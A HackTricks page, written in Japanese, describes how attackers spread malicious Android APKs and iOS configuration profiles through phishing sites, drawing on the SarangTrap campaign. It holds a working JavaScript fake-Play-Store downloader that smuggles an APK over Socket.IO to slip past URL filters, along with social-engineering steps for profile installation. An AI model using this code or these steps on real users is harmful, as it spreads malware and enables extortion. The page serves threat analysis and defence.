# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページでは、脅威アクターが phishing（SEO、social engineering、fake stores、dating apps など）を通じて **malicious Android APKs** と **iOS mobile-configuration profiles** を配布するために使う技術を扱います。
> 内容は、Zimperium zLabs が公開した SarangTrap キャンペーン（2025）およびその他の公開研究を基にしています。

## Attack Flow

1. **SEO/Phishing Infrastructure**
* 類似ドメインを何十個も登録する（dating、cloud share、car service…）。
– `<title>` 要素にローカル言語のキーワードと絵文字を使って Google で上位表示を狙う。
– Android (`.apk`) と iOS のインストール手順の両方を同じ landing page でホストする。
2. **First Stage Download**
* Android: 署名なし、または “third-party store” の APK への直接リンク。
* iOS: `itms-services://` または malicious **mobileconfig** profile への通常の HTTPS リンク（以下参照）。
3. **Android Post-install Behaviour**
* C2-gated execution、permission abuse、dropper bypasses、background collection、その他の post-install malware behaviour は、下の専用 Android Malware Post-Exploitation ページで扱います。
4. **iOS Delivery Technique**
* 単一の **mobile-configuration profile** で `PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration` などを要求し、デバイスを “MDM”-like supervision に登録できる。
* Social-engineering の手順:
1. Settings を開く ➜ *Profile downloaded*。
2. *Install* を3回タップする（phishing page 上の screenshots）。
3. 署名なし profile を信頼する ➜ attacker は App Store review なしで *Contacts* と *Photo* の entitlement を取得する。
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads は、ブランド付きの icon/label で **phishing URL を Home Screen に固定** できる。
* Web Clips は **full‑screen** で動作でき（browser UI を隠す）、さらに **non‑removable** にできるため、victim は icon を消すために profile を削除する必要がある。
6. **Network Layer**
* Plain HTTP。多くの場合、HOST header は `api.<phishingdomain>.com` のように port 80 で使われる。
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLS なし → 見つけやすい）。

## Android Malware Post-Exploitation

C2、Accessibility abuse、overlays、ATS automation、staged DEX loading、premium SMS、persistence などの post-install Android malware tradecraft については、以下を参照してください:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

攻撃者は、静的な APK リンクの代わりに、Google Play 風の lures に埋め込まれた Socket.IO/WebSocket チャネルをますます使うようになっています。これにより payload URL が隠され、URL/extension フィルタを回避し、現実的な install UX を維持できます。

現場で観測される典型的な client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

なぜ単純な制御を回避できるのか:
- 静的な APK URL は公開されず、payload は WebSocket フレームからメモリ上で再構築される。
- 直接の .apk レスポンスをブロックする URL/MIME/拡張子フィルタは、WebSockets/Socket.IO 経由でトンネリングされたバイナリデータを見逃す可能性がある。
- WebSockets を実行しないクローラや URL サンドボックスは payload を取得できない。

WebSocket tradecraft と tooling も参照:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References


- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Socket.IO](https://socket.io)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
